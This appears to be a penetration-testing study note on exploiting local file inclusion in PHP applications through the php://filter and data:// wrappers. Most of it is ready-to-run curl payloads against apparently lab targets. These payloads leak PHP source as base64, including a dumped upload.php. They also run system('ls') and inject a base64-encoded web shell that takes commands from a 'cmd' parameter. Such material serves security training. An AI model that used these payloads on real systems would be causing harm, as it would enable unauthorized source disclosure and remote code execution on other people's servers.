
the php://filter wrapper allows us to view .php files instead of executing them when the webpage is vulnerable to LFI.

& the data:// wrapper allows to achieve code execution.
---

## PoC php:// wrapper

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```
#### Base64

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

When we enumerated upload.php file, sometimes we have to remove the .php at the end:

```
curl http://192.168.237.229/index.php?file=php://filter/convert.base64-encode/resource=upload
PD9waHAKaWYgKCRfRklMRVMgJiYgJF9GSUxFU1snaW1nJ10pIHsKICAgIAogICAgaWYgKCFlbXB0eSgkX0ZJTEVTWydpbWcnXVsnbmFtZSddWzBdKSkgewogICAgICAgIAogICAgICAgICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogICAgICAgICR6aXBfbmFtZSA9IGdldGN3ZCgpIC4gIi91cGxvYWRzL3VwbG9hZF8iIC4gdGltZSgpIC4gIi56aXAiOwogICAgICAgIAogICAgICAgIC8vIENyZWF0ZSBhIHppcCB0YXJnZXQKICAgICAgICBpZiAoJHppcC0+b3BlbigkemlwX25hbWUsIFppcEFyY2hpdmU6OkNSRUFURSkgIT09IFRSVUUpIHsKICAgICAgICAgICAgJGVycm9yIC49ICJTb3JyeSBaSVAgY3JlYXRpb24gaXMgbm90IHdvcmtpbmcgY3VycmVudGx5Ljxici8+IjsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJGltYWdlQ291bnQgPSBjb3VudCgkX0ZJTEVTWydpbWcnXVsnbmFtZSddKTsKICAgICAgICBmb3IoJGk9MDskaTwkaW1hZ2VDb3VudDskaSsrKSB7CiAgICAgICAgCiAgICAgICAgICAgIGlmICgkX0ZJTEVTWydpbWcnXVsndG1wX25hbWUnXVskaV0gPT0gJycpIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRuZXduYW1lID0gZGF0ZSgnWW1kSGlzJywgdGltZSgpKSAuIG10X3JhbmQoKSAuICcudG1wJzsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIE1vdmluZyBmaWxlcyB0byB6aXAuCiAgICAgICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoJF9GSUxFU1snaW1nJ11bJ25hbWUnXVskaV0sIGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbJ2ltZyddWyd0bXBfbmFtZSddWyRpXSkpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gbW92aW5nIGZpbGVzIHRvIHRoZSB0YXJnZXQgZm9sZGVyLgogICAgICAgICAgICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snaW1nJ11bJ3RtcF9uYW1lJ11bJGldLCAnLi91cGxvYWRzLycgLiAkbmV3bmFtZSk7CiAgICAgICAgfQogICAgICAgICR6aXAtPmNsb3NlKCk7CiAgICAgICAgCiAgICAgICAgLy8gQ3JlYXRlIEhUTUwgTGluayBvcHRpb24gdG8gZG93bmxvYWQgemlwCiAgICAgICAgJHN1Y2Nlc3MgPSBiYXNlbmFtZSgkemlwX25hbWUpOwogICAgfSBlbHNlIHsKICAgICAgICAkZXJyb3IgPSAnPHN0cm9uZz5FcnJvciEhIDwvc3Ryb25nPiBQbGVhc2Ugc2VsZWN0IGEgZmlsZS4nOwogICAgfQp9Cg==
```

## PoC data:// wrapper

This wrapper is used to embed data elements as plaintext or encoded data in the running web application's code.

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

#### Base64 Command Injection

```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
```

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
``` 